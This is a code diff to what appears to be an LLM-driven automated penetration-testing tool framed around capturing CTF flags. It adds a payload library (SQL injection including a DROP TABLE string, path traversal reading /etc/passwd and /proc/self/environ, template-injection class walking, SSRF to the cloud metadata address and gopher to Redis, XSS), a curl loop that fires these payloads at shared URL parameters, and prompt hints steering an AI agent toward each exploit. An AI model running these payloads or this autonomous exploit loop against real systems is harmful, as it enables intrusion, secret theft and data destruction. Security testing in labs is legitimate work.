@@ -124,6 +124,7 @@ OLLAMA_TIMEOUT  = int(_os.environ.get("OLLAMA_TIMEOUT", "600"))
 _MODEL_TEMP     = float(_os.environ.get("MODEL_TEMPERATURE", "0.5"))
 _MODEL_THINK    = _os.environ.get("MODEL_THINK", "false").lower() in ("1", "true", "yes")
 BROWSER_MAX_ACTIONS = int(_os.environ.get("MEGATRON_BROWSER_MAX_ACTIONS", "15"))
+BROWSER_MAX_ANGLES  = int(_os.environ.get("MEGATRON_BROWSER_ANGLES", "2"))
 
 _client = OllamaClient(host=OLLAMA_HOST, timeout=OLLAMA_TIMEOUT)
 
@@ -525,7 +526,8 @@ def _build_url_for_finding(target: str, finding: Finding) -> str:
     return base
 
 
-def _browser_exploit(target_url: str, finding: Finding, max_actions: int | None = None) -> tuple[bool, str]:
+def _browser_exploit(target_url: str, finding: Finding, max_actions: int | None = None,
+                     prompt_angle: str = "default", angle_hint: str = "") -> tuple[bool, str]:
     """
     LLM-driven browser exploit loop with session-aware planning (v0.8.0).
 
@@ -549,8 +551,12 @@ def _browser_exploit(target_url: str, finding: Finding, max_actions: int | None 
 
     max_actions = max_actions if max_actions is not None else BROWSER_MAX_ACTIONS
     goal = f"Prove '{finding.vuln_name}' by capturing FLAG{{...}} from the target."
+    if angle_hint:
+        goal += f"\n\n{angle_hint}"
     session_notes: list[str] = []
     stuck_counter: dict[str, int] = {}
+    if prompt_angle != "default":
+        print(f"    [browser-angle={prompt_angle}]")
 
     try:
         with BrowserSession(target_url, headless=True, timeout_ms=8000) as sess:
@@ -674,6 +680,121 @@ def _ask_structured_typed(prompt: str, schema_class, model_name: str | None = No
         return None
 
 
+_PARAM_RE = re.compile(r"[?&]([A-Za-z_][A-Za-z0-9_]{0,40})=")
+
+
+def _extract_params_from_findings(findings: list[Finding]) -> dict[str, list[Finding]]:
+    """
+    Scan every finding's vuln_name + description for URL param names (?foo= / &foo=).
+    Return {param_name: [findings that mention it]} for params shared by 2+ findings.
+    """
+    param_map: dict[str, list[Finding]] = {}
+    for f in findings:
+        haystack = f"{f.vuln_name} {f.description}"
+        for m in set(_PARAM_RE.findall(haystack)):
+            param_map.setdefault(m.lower(), []).append(f)
+    return {p: fs for p, fs in param_map.items() if len(fs) >= 2}
+
+
+_CHAIN_PAYLOADS = {
+    "numeric_idor": ["1", "2", "3", "10", "42", "100", "admin", "0", "-1"],
+    "sqli":        ["' OR 1=1--", "1' OR '1'='1", "1 UNION SELECT 1,2,flag FROM flags--", "1'; DROP TABLE--"],
+    "lfi":         ["/etc/passwd", "../../../etc/passwd", "../../../../../../etc/passwd",
+                    "..%2f..%2fetc%2fpasswd", "/flag.txt", "/flag", "/proc/self/environ"],
+    "ssti":        ["{{7*7}}", "${{7*7}}", "<%= 7*7 %>", "{{config}}", "{{''.__class__.__mro__[1].__subclasses__()}}"],
+    "ssrf":        ["http://127.0.0.1/", "http://localhost/", "http://169.254.169.254/latest/meta-data/",
+                    "file:///etc/passwd", "gopher://127.0.0.1:6379/"],
+    "xss":         ["<script>alert(1)</script>", "\"><script>alert(1)</script>", "javascript:alert(1)"],
+}
+
+
+def _correlate_and_chain_exploit(report: ScanReport, target_url: str) -> tuple[bool, str]:
+    """
+    Cross-finding param correlation (v0.9.0 differentiator vs Shannon):
+    Scan all findings for URL param names they share. If 2+ findings mention the
+    same param (e.g., ?id=), that's strong signal for a chained-exploit attempt:
+    iterate common payload variants against that param and check every response
+    for FLAG{...}.
+
+    Runs AFTER the per-finding exploit loop as a final catch-all. Time-boxed to
+    ~60s per correlated param (5-10 params × 6-9 payloads × short HTTP timeout).
+    """
+    param_map = _extract_params_from_findings(report.findings)
+    if not param_map:
+        return False, ""
+
+    print(f"  [CORRELATE] {len(param_map)} shared param(s) across findings: {list(param_map.keys())}")
+    from tools import _webify, run_tool, AUTH_COOKIE, AUTH_HEADER
+    base = _webify(target_url).rstrip("/")
+
+    attempts_captured: list[str] = []
+    for param, findings in list(param_map.items())[:5]:
+        tags_seen = set()
+        for f in findings:
+            desc_l = (f.vuln_name + " " + f.description).lower()
+            for tag in ("idor", "sqli", "sql injection", "lfi", "path traversal",
+                        "ssti", "template injection", "ssrf", "xss"):
+                if tag in desc_l:
+                    tags_seen.add(tag)
+        payload_pool: list[str] = []
+        payload_pool += _CHAIN_PAYLOADS["numeric_idor"] if any("idor" in t for t in tags_seen) else _CHAIN_PAYLOADS["numeric_idor"][:3]
+        if any(t in tags_seen for t in ("sqli", "sql injection")):     payload_pool += _CHAIN_PAYLOADS["sqli"]
+        if any(t in tags_seen for t in ("lfi", "path traversal")):    payload_pool += _CHAIN_PAYLOADS["lfi"]
+        if any(t in tags_seen for t in ("ssti", "template injection")):payload_pool += _CHAIN_PAYLOADS["ssti"]
+        if "ssrf" in tags_seen:                                        payload_pool += _CHAIN_PAYLOADS["ssrf"]
+        if "xss"  in tags_seen:                                        payload_pool += _CHAIN_PAYLOADS["xss"]
+
+        for payload in payload_pool[:12]:
+            from urllib.parse import quote
+            url = f"{base}/?{param}={quote(payload, safe='')}"
+            cmd = ["curl", "-sk", "-A", "MEGATRON/0.9", "--max-time", "5", url]
+            if AUTH_COOKIE:
+                cmd += ["-H", f"Cookie: {AUTH_COOKIE}"]
+            if AUTH_HEADER:
+                cmd += ["-H", AUTH_HEADER]
+            body = run_tool(cmd, timeout=8)
+            flags = FLAG_RE.findall(body)
+            if flags:
+                attempts_captured.append(flags[0])
+                print(f"  [CORRELATE-CAPTURED] {flags[0]} via ?{param}={payload[:40]}")
+                return True, f"[CORRELATE-EXPLOIT captured] {flags[0]} via ?{param}={payload[:40]}"
+    return False, f"[correlate] tried {sum(len(v) for v in param_map.values())} finding-param pairs, no flag"
+
+
+def _pick_angles_for_finding(finding: Finding, max_angles: int) -> list[tuple[str, str]]:
+    """
+    Pick prompt angles most relevant to this finding's vuln class first.
+    Multi-shot ensemble: iterate `max_angles` different exploitation strategies.
+    """
+    haystack = f"{finding.vuln_name} {finding.description}".lower()
+    priority: list[str] = []
+    if any(t in haystack for t in ("sqli", "sql injection", "sqlmap")):        priority.append("sqli-first")
+    if any(t in haystack for t in ("lfi", "path traversal", "file inclusion")):priority.append("lfi-first")
+    if any(t in haystack for t in ("idor", "insecure direct object", "broken access")): priority.append("idor-first")
+    if any(t in haystack for t in ("ssti", "template injection", "jinja")):    priority.append("ssti-first")
+    ordered: list[tuple[str, str]] = []
+    seen: set[str] = set()
+    for name in ["default"] + priority + [a[0] for a in _RETRY_PROMPT_ANGLES]:
+        if name in seen:
+            continue
+        seen.add(name)
+        for a_name, a_hint in _RETRY_PROMPT_ANGLES:
+            if a_name == name:
+                ordered.append((a_name, a_hint))
+                break
+    return ordered[:max(1, max_angles)]
+
+
+_RETRY_PROMPT_ANGLES = [
+    ("default", "General exploitation — try the most likely vector for this finding."),
+    ("lfi-first",  "SPECIFIC ANGLE: this is likely LFI / path traversal. Try ../../../etc/passwd, /flag.txt, /proc/self/environ variants in every param + URL segment."),
+    ("sqli-first", "SPECIFIC ANGLE: this is likely SQL injection. Try ' OR 1=1--, UNION SELECT flag FROM flags--, blind time-based, boolean-based in every input."),
+    ("idor-first", "SPECIFIC ANGLE: this is likely IDOR. Register + login first; then increment every numeric ID in URLs and params; try user_id=1, id=admin, uid=0."),
+    ("ssti-first", "SPECIFIC ANGLE: this is likely SSTI. Try {{7*7}}, ${{7*7}}, {{config}}, Jinja2 SSTI RCE payload in every form field and URL param."),
+    ("recon-again", "SPECIFIC ANGLE: previous attempts gave nothing. Restart from scratch — enumerate /admin, /api, /debug, /console, /flag paths first; then form-based exploration."),
+]
+
+
 def _run_exploit_loop(report: ScanReport, target: str, max_attempts: int = 5) -> int:
     """
     Multi-tier exploitation loop (MEGATRON differentiator vs Shannon):
@@ -717,11 +838,18 @@ def _run_exploit_loop(report: ScanReport, target: str, max_attempts: int = 5) ->
 
         if is_web and _BROWSER_AVAILABLE:
             url_for_finding = _build_url_for_finding(target, finding)
-            print(f"  [EXPLOIT-BROWSER] driving Chromium against '{finding.vuln_name}' at {url_for_finding}")
-            got_flag, evidence = _browser_exploit(url_for_finding, finding)
-            print(f"  [EXPLOIT-BROWSER result] flag={got_flag} evidence={evidence[:180]}")
-            if evidence:
-                finding.description += f"\n{evidence}"
+            angle_pool = _pick_angles_for_finding(finding, BROWSER_MAX_ANGLES)
+            for angle_name, angle_hint in angle_pool:
+                print(f"  [EXPLOIT-BROWSER angle={angle_name}] driving Chromium against '{finding.vuln_name}' at {url_for_finding}")
+                got_flag, evidence = _browser_exploit(
+                    url_for_finding, finding,
+                    prompt_angle=angle_name, angle_hint=angle_hint,
+                )
+                print(f"  [EXPLOIT-BROWSER angle={angle_name} result] flag={got_flag} evidence={evidence[:150]}")
+                if evidence:
+                    finding.description += f"\n{evidence}"
+                if got_flag:
+                    break
 
         if not got_flag:
             got_flag2, evidence2 = _exploit_finding(finding, target)
@@ -733,6 +861,25 @@ def _run_exploit_loop(report: ScanReport, target: str, max_attempts: int = 5) ->
             captured += 1
             finding.confidence = "confirmed"
             finding.severity = "critical"
+
+    if captured == 0 and report.findings:
+        chained_ok, chain_evidence = _correlate_and_chain_exploit(report, target)
+        if chained_ok:
+            report.findings.append(Finding(
+                vuln_name="Flag Captured via Cross-Finding Param Chain",
+                severity="critical",
+                port="",
+                service="",
+                description=chain_evidence,
+                fix="Sanitize parameter inputs and implement proper authorization.",
+                cve_id=None,
+                evidence_lines=[],
+                confidence="confirmed",
+                cvss_score=10.0,
+            ))
+            captured += 1
+        elif chain_evidence:
+            print(f"  [CORRELATE] {chain_evidence[:180]}")
 
     return captured
 
